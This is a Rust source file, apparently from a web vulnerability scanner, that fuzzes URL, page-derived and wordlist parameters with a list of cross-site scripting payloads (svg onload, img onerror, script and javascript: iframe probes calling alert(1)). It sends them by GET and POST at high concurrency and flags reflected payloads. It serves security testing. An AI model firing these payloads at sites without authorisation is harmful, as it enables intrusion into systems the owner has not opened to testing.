use reqwest::Client;
use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
use std::collections::{HashSet, HashMap};
use log::{info, error};
use colored::*;
use regex::Regex;
use url::Url;

use futures::StreamExt;

use crate::utils::{
    print_error, build_url_with_pairs, sanitize_payload, payload_contains_indicators,
    payload_present_in_dom, payload_inside_script_context,
};

pub async fn check_xss(client: &Client, domain: &str, verbose: bool, wordlist: &Vec<String>) {
        let payloads = vec![
            "\"><svg/onload=alert(1)>",
            "'\"><img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "'\"><iframe src=\"javascript:alert(1)\">",
            "\"><math href=\"javascript:alert(1)\">",
            "onclick=alert(1)<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<body onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<embed src=x onerror=alert(1)>",
            "`FUZZ;//",
            "'FUZZ;//",
            "\"FUZZ;//"
        ];
    
        let methods = vec!["GET", "POST"];
    
        for method in methods {
            let parsed_url = match Url::parse(domain) {
                Ok(url) => url,
                Err(e) => {
                    print_error(verbose, &format!("Error parsing URL: {}", domain), &e);
                    error!("Error parsing URL: {}: {}", domain, e);
                    continue;
                }
            };
    
            let query_pairs: Vec<(String, String)> = parsed_url.query_pairs().map(|(k, v)| (k.to_string(), v.to_string())).collect();
    
            let response = match client.get(domain).send().await {
                Ok(resp) => resp,
                Err(e) => {
                    print_error(verbose, &format!("Error fetching domain: {}", domain), &e);
                    continue;
                }
            };
    
            let body = match response.text().await {
                Ok(text) => text,
                Err(e) => {
                    print_error(verbose, &format!("Error reading response body from: {}", domain), &e);
                    continue;
                }
            };
    
            let input_name_regex = Regex::new(r#"<input(?:[^>]+name="(.*?)"[^>]*)?>"#).unwrap();
            let var_name_regex = Regex::new(r#"var\s+(\w+)"#).unwrap();
            let url_param_regex = Regex::new(r#"&(\w+)="#).unwrap();
    
            let mut param_names = HashSet::new();
    
            for caps in input_name_regex.captures_iter(&body) {
                if let Some(name) = caps.get(1) {
                    param_names.insert(name.as_str().to_string());
                }
            }
    
            for caps in var_name_regex.captures_iter(&body) {
                if let Some(name) = caps.get(1) {
                    param_names.insert(name.as_str().to_string());
                }
            }
    
            for caps in url_param_regex.captures_iter(&body) {
                if let Some(name) = caps.get(1) {
                    param_names.insert(name.as_str().to_string());
                }
            }
    
            let xss_found = Arc::new(AtomicBool::new(false));
            let payloads = Arc::new(payloads.clone());
            let parsed_url_arc = Arc::new(parsed_url.clone());
            if !query_pairs.is_empty() {
                let query_pairs = Arc::new(query_pairs);
    
                let tasks: Vec<_> = query_pairs.iter().enumerate().flat_map(|(i, (param, _))| {
                    let payloads = Arc::clone(&payloads);
                    let client = client.clone();
                    let parsed_url = Arc::clone(&parsed_url_arc);
                    let param = param.clone();
                    let query_pairs = Arc::clone(&query_pairs);
                    let verbose = verbose;
                    let xss_found = Arc::clone(&xss_found);
                    let method = method.to_string();
    
                    payloads.iter().map(move |payload| {
                        let client = client.clone();
                        let param = param.clone();
                        let payload = (*payload).to_string();
                        let parsed_url = Arc::clone(&parsed_url);
                        let query_pairs = Arc::clone(&query_pairs);
                        let xss_found = Arc::clone(&xss_found);
                        let method = method.clone();
                        async move {
                            if xss_found.load(Ordering::Relaxed) {
                                return;
                            }
    
                            let mut single_payload_pairs = (*query_pairs).clone();
                            single_payload_pairs[i].1 = payload.to_string();
                            if let Some(payload_url) = build_url_with_pairs(&parsed_url, &single_payload_pairs) {
                                info!("Injecting payload into '{}' parameter: {} in URL: {}", param, payload, payload_url);
                                let response = match method.as_str() {
                                    "GET" => client.get(&payload_url).send().await,
                                    "POST" => {
                                        let form_data = single_payload_pairs.iter().cloned().collect::<HashMap<_, _>>();
                                        client.post(&payload_url)
                                            .form(&form_data)
                                            .header("Content-Type", "application/x-www-form-urlencoded")
                                            .send()
                                            .await
                                    }
                                    _ => unreachable!(),
                                };
                                match response {
                                    Ok(response) => {
                                        match response.text().await {
                                            Ok(body) => {
                                                let sanitized = sanitize_payload(&payload, &body);
                                                if body.contains(&payload) {
                                                    println!(
                                                        "{} ({}): {}",
                                                        "XSS FOUND".red().bold(),
                                                        method,
                                                        payload_url
                                                    );
                                                    info!("XSS found in '{}' parameter in {}", param, payload_url);
                                                    xss_found.store(true, Ordering::Relaxed);
                                                    return;
                                                }
                                                if payload_inside_script_context(&payload, &body) {
                                                    println!(
                                                        "{} (parameter '{}', {}): {}",
                                                        "POSSIBLE XSS IN SCRIPT".red(),
                                                        param,
                                                        method,
                                                        payload_url
                                                    );
                                                    info!("Possibly executable XSS in scripting context for '{}' parameter in {}", param, payload_url);
                                                    xss_found.store(true, Ordering::Relaxed);
                                                    return;
                                                }
                                                if payload_contains_indicators(&payload, &body) || payload_present_in_dom(&body) {
                                                    println!(
                                                        "{} (parameter '{}', {}): {}",
                                                        "POSSIBLE XSS".red(),
                                                        param,
                                                        method,
                                                        payload_url
                                                    );
                                                    info!("Possibly executable XSS in the '{}' parameter in {}", param, payload_url);
                                                    xss_found.store(true, Ordering::Relaxed);
                                                    return;
                                                }
                                                if verbose && sanitized {
                                                    println!(
                                                        "{} (parameter '{}', {}): {}",
                                                        "Sanitized Payload".yellow(),
                                                        param,
                                                        method,
                                                        payload_url
                                                    );
                                                    println!(
                                                        "Details: Payload was detected as sanitized in the '{}' parameter of the URL: {}",
                                                        param, payload_url
                                                    );
                                                }
                                                if verbose && !sanitized {
                                                    println!(
                                                        "{} (parameter '{}', {}): {}",
                                                        "Not Vulnerable".green(),
                                                        param,
                                                        method,
                                                        payload_url
                                                    );
                                                    info!("Non-vulnerable URL for '{}' parameter: {}", param, payload_url);
                                                }
                                            }
                                            Err(e) => {
                                                print_error(verbose, &format!("Error reading response body from {}", payload_url), &e);
                                                error!("Error reading response body from {}: {}", payload_url, e);
                                            },
                                        }
                                    }
                                    Err(e) => {
                                        print_error(verbose, &format!("Error making request to {}", payload_url), &e);
                                        error!("Error making request to {}: {}", payload_url, e);
                                    },
                                }
                            }
                        }
                    }).collect::<Vec<_>>()
                }).collect();
    
                let mut stream = futures::stream::iter(tasks).buffer_unordered(50);
                while let Some(_) = stream.next().await {
                    if xss_found.load(Ordering::Relaxed) {
                        break;
                    }
                }
            }
    
            if xss_found.load(Ordering::Relaxed) {
                continue;
            }
    
            if !param_names.is_empty() {
                let base_url = {
                    let mut url = parsed_url.clone();
                    url.set_query(None);
                    Arc::new(url)
                };
    
                let tasks: Vec<_> = param_names.iter().flat_map(|param| {
                    let payloads = Arc::clone(&payloads);
                    let client = client.clone();
                    let base_url = Arc::clone(&base_url);
                    let param = param.clone();
                    let verbose = verbose;
                    let xss_found = Arc::clone(&xss_found);
                    let method = method.to_string();
    
                    payloads.iter().map(move |payload| {
                        let client = client.clone();
                        let param = param.clone();
                        let payload = (*payload).to_string();
                        let base_url = Arc::clone(&base_url);
                        let xss_found = Arc::clone(&xss_found);
                        let method = method.clone();
                        async move {
                            // Check if XSS is already found for this host
                            if xss_found.load(Ordering::Relaxed) {
                                return;
                            }
    
                            let query_pairs = vec![(param.clone(), payload.to_string())];
                            if let Some(payload_url) = build_url_with_pairs(&base_url, &query_pairs) {
                                info!("Testing payload with parameter '{}' extracted from page in URL: {}", param, payload_url);
                                let response = match method.as_str() {
                                    "GET" => client.get(&payload_url).send().await,
                                    "POST" => {
                                        let form_data = query_pairs.iter().cloned().collect::<HashMap<_, _>>();
                                        client.post(&payload_url)
                                            .form(&form_data)
                                            .header("Content-Type", "application/x-www-form-urlencoded")
                                            .send()
                                            .await
                                    }
                                    _ => unreachable!(),
                                };
                                match response {
                                    Ok(response) => {
                                        match response.text().await {
                                            Ok(body) => {
                                                let sanitized = sanitize_payload(&payload, &body);
                                                if body.contains(&payload) {
                                                    println!(
                                                        "{} ({}): {}",
                                                        "XSS FOUND".red().bold(),
                                                        method,
                                                        payload_url
                                                    );
                                                    info!("XSS found in '{}' parameter in {}", param, payload_url);
                                                    xss_found.store(true, Ordering::Relaxed);
                                                    return;
                                                }
                                                if payload_inside_script_context(&payload, &body) {
                                                    println!(
                                                        "{} (parameter '{}', {}): {}",
                                                        "POSSIBLE XSS IN SCRIPT".red(),
                                                        param,
                                                        method,
                                                        payload_url
                                                    );
                                                    info!("Possibly executable XSS in scripting context for '{}' parameter in {}", param, payload_url);
                                                    xss_found.store(true, Ordering::Relaxed);
                                                    return;
                                                }
                                                if payload_contains_indicators(&payload, &body) || payload_present_in_dom(&body) {
                                                    println!(
                                                        "{} (parameter '{}', {}): {}",
                                                        "POSSIBLE XSS".red(),
                                                        param,
                                                        method,
                                                        payload_url
                                                    );
                                                    info!("Possibly executable XSS in parameter '{}' in {}", param, payload_url);
                                                    xss_found.store(true, Ordering::Relaxed);
                                                    return;
                                                }
                                                if verbose && sanitized {
                                                    println!(
                                                        "{} (parameter '{}', {}): {}",
                                                        "Sanitized Payload".yellow(),
                                                        param,
                                                        method,
                                                        payload_url
                                                    );
                                                    println!(
                                                        "Details: Payload was detected as sanitized in URL parameter '{}': {}",
                                                        param, payload_url
                                                    );
                                                }
                                                if verbose && !sanitized {
                                                    println!(
                                                        "{} (parameter '{}', {}): {}",
                                                        "Not Vulnerable".green(),
                                                        param,
                                                        method,
                                                        payload_url
                                                    );
                                                    info!("Non-vulnerable URL for parameter '{}' : {}", param, payload_url);
                                                }
                                            }
                                            Err(e) => {
                                                print_error(verbose, &format!("Error reading response body from {}", payload_url), &e);
                                                error!("Error reading response body from {}: {}", payload_url, e);
                                            },
                                        }
                                    }
                                    Err(e) => {
                                        print_error(verbose, &format!("Error making request to {}", payload_url), &e);
                                        error!("Error making request to {}: {}", payload_url, e);
                                    },
                                }
                            }
                        }
                    }).collect::<Vec<_>>()
                }).collect();
    
                let mut stream = futures::stream::iter(tasks).buffer_unordered(50);
                while let Some(_) = stream.next().await {
                    if xss_found.load(Ordering::Relaxed) {
                        break;
                    }
                }
            }
    
            if xss_found.load(Ordering::Relaxed) {
                continue;
            }
    
            {
                let base_url = {
                    let mut url = parsed_url.clone();
                    url.set_query(None);
                    Arc::new(url)
                };
    
                let wordlist_chunks: Vec<_> = wordlist.chunks(35).map(|chunk| chunk.to_vec()).collect();
    
                let tasks: Vec<_> = wordlist_chunks.into_iter().flat_map(|param_chunk| {
                    let payloads = Arc::clone(&payloads);
                    let client = client.clone();
                    let base_url = Arc::clone(&base_url);
                    let param_chunk = Arc::new(param_chunk);
                    let verbose = verbose;
                    let xss_found = Arc::clone(&xss_found);
                    let method = method.to_string();
    
                    payloads.iter().map(move |payload| {
                        let client = client.clone();
                        let payload = (*payload).to_string();
                        let param_chunk = Arc::clone(&param_chunk);
                        let base_url = Arc::clone(&base_url);
                        let xss_found = Arc::clone(&xss_found);
                        let method = method.clone();
                        async move {
                            // Check if XSS is already found for this host
                            if xss_found.load(Ordering::Relaxed) {
                                return;
                            }
    
                            let query_pairs: Vec<(String, String)> = param_chunk.iter().map(|param| (param.clone(), payload.to_string())).collect();
                            if let Some(payload_url) = build_url_with_pairs(&base_url, &query_pairs) {
                                info!("Testing payload with wordlist parameter chunk in URL: {}", payload_url);
                                let response = match method.as_str() {
                                    "GET" => client.get(&payload_url).send().await,
                                    "POST" => {
                                        let form_data = query_pairs.iter().cloned().collect::<HashMap<_, _>>();
                                        client.post(&payload_url)
                                            .form(&form_data)
                                            .header("Content-Type", "application/x-www-form-urlencoded")
                                            .send()
                                            .await
                                    }
                                    _ => unreachable!(),
                                };
                                match response {
                                    Ok(response) => {
                                        match response.text().await {
                                            Ok(body) => {
                                                let sanitized = sanitize_payload(&payload, &body);
                                                if body.contains(&payload) {
                                                    println!(
                                                        "{} ({}): {}",
                                                        "XSS FOUND".red().bold(),
                                                        method,
                                                        payload_url
                                                    );
                                                    info!("XSS found with wordlist parameter chunk in {}", payload_url);
                                                    xss_found.store(true, Ordering::Relaxed);
                                                    return;
                                                }
                                                if payload_inside_script_context(&payload, &body) {
                                                    println!(
                                                        "{} ({}): {}",
                                                        "POSSIBLE XSS IN SCRIPT".red(),
                                                        method,
                                                        payload_url
                                                    );
                                                    info!("XSS possibly executable in the context of script in {}", payload_url);
                                                    xss_found.store(true, Ordering::Relaxed);
                                                    return;
                                                }
                                                if payload_contains_indicators(&payload, &body) || payload_present_in_dom(&body) {
                                                    println!(
                                                        "{} ({}): {}",
                                                        "POSSIBLE XSS".red(),
                                                        method,
                                                        payload_url
                                                    );
                                                    info!("Possibly executable XSS in {}", payload_url);
                                                    xss_found.store(true, Ordering::Relaxed);
                                                    return;
                                                }
                                                if verbose && sanitized {
                                                    println!(
                                                        "{} ({}): {}",
                                                        "Sanitized Payload".yellow(),
                                                        method,
                                                        payload_url
                                                    );
                                                    println!(
                                                        "Details: Payload was detected as sanitized at URL: {}",
                                                        payload_url
                                                    );
                                                }
                                                if verbose && !sanitized {
                                                    println!(
                                                        "{} ({}): {}",
                                                        "Not Vulnerable".green(),
                                                        method,
                                                        payload_url
                                                    );
                                                    info!("Non-vulnerable URL: {}", payload_url);
                                                }
                                            }
                                            Err(e) => {
                                                print_error(verbose, &format!("Error reading response body from {}", payload_url), &e);
                                                error!("Error reading response body from {}: {}", payload_url, e);
                                            },
                                        }
                                    }
                                    Err(e) => {
                                        print_error(verbose, &format!("Error making request to {}", payload_url), &e);
                                        error!("Error making request to {}: {}", payload_url, e);
                                    },
                                }
                            }
                        }
                    }).collect::<Vec<_>>()
                }).collect();
    
                let mut stream = futures::stream::iter(tasks).buffer_unordered(50);
                while let Some(_) = stream.next().await {
                    // Stop the stream if XSS is found
                    if xss_found.load(Ordering::Relaxed) {
                        break;
                    }
                }
            }
        }
    }
